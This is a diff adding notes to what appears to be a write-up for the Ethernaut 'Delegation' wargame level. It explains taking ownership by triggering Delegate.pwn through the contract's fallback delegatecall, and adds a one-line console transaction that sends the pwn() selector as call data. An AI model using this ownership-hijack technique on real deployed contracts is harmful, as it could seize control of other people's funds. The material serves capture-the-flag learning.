@@ -1,3 +1,9 @@
 #How To
 claimed the ownership of instance by calling Delegate.pwn in target contract Delegation using low levl function in fallback function
 from contract Delegation.
+
+Or
+
+From the console, 
+  await contract.sendTransaction({from:player, to:instance, data: "0xdd365b8b15d5d78ec041b851b68c8b985bee78bee0b87c4acf261024d8beabab"})
+  This claims the level with ease.
